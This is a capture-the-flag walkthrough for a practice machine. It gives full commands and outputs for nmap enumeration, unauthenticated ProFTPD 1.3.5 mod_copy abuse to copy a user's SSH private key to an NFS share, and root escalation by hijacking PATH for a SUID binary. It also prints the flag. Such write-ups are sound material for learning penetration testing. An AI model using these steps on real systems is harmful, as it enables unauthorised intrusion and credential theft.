# Kenobi

```text
export IP=10.10.42.124
```
- Performing the legendary nmap scan to know the services running on the machine.

```text
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
111/tcp  open  rpcbind      syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
2049/tcp open  nfs          syn-ack

```

### Enumerating samba for shares

- Using nmap to enumerate shares
```text
nmap -p 445,139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.42.124
```
Lemme look through quickly see what i can find. I actually dont understand much over there. 	

- Theres an rpcbind service running on the server. Just got to read about this one, i honestly dont know much about it. Ive seen it occassionally though.
```text
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount -oN scans/rpcbind $IP
```
Okay from what i am reading on the internet, the rpcbind(a 'bind') is just like a dns server. It registers rpc processes running on the system(ex nfs) and the port numbers they are listening on and then maps them to a unique number. So if a client  system contacts the rpcbind(runs on port 111) with the number of the rpc process(basically a server serving something) called the servers rpc number, the rpcbind will redirect you to that server running on the host machine so you can communicate with it.


### Gain initial Access with ProFtpd

- So i'm trying to use searchsploit to find all the vulnerabilities of this version of ProFtpd running on the machine.
The version of proftpd is ` 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.59.166] `. 
```text
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                   |  Path
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                        | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                              | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                        | linux/remote/36742.txt
------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

- Using the mod_copy which implements the `SITE CPTO` and `SITE CPFR` which allows any unathenticated user to copy files from and to any part of the file system. From previous recon work we know ftp is running as kenobi user and ssh key is generated for that user so we copy it into the directory associated with the nfs server running on the machine which is `/var`.

```text
kali@kali:~/ctf-me/TryHackMe/Kenobi$ nc $IP 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.59.166]
SITE CPFR /home/Kenobi/.ssh/id_rsa
550 /home/Kenobi/.ssh/id_rsa: No such file or directory
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```

- We now mount that filesystem on our system with these commands.
```text
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```
We then login with ssh as the user kenobi and look around for the flag. Which i got.

### Priviledge Escalation with path variable manipulation

- On linux machines we have suid, sgid binaries and sticky bits. Suid binaries allow you to run commands as the owner of the file while sgid allow you to run commands as the group owner of the file. Sticky dont do anything anything special.
Good thing to do when you get on linux servers as a pentester is to look around for suid, sgid binaries. `find / -perm -u=s -type f 2>/dev/null`

- We found a particular abnormal suid executable. It is possible running as root user and it is executing some commands also.  Now, the commands it is running are not absolute paths to the commands but just the relative paths in the path variable. If we change the path variable and make it look into another directory and finds the same file it will totally execute it. Lets try that now.

How i got into the root folder.
```text
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ ls
curl  systemd-private-6c0e92cdf0684821b63d863fc22c45de-systemd-timesyncd.service-y6oO5n
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ ./curl
$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
$ exit
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
# Connection to 10.10.59.166 closed by remote host.
Connection to 10.10.59.166 closed.

```
